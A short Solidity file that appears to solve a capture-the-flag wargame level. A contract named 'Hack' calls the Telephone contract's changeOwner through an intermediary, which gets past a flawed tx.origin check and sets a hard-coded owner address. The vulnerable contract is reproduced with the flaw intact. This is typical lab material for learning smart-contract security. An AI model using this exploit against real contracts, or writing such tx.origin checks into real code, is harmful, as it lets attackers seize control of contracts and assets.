// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack {
    Telephone private immutable telephone;

    constructor(address _target) {
        telephone = Telephone(_target);
    }

    function callTelephone() external {
        telephone.changeOwner(0x61f627aEde53cd928fB788AF7713d3212119dDC5);
    }
    
}

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
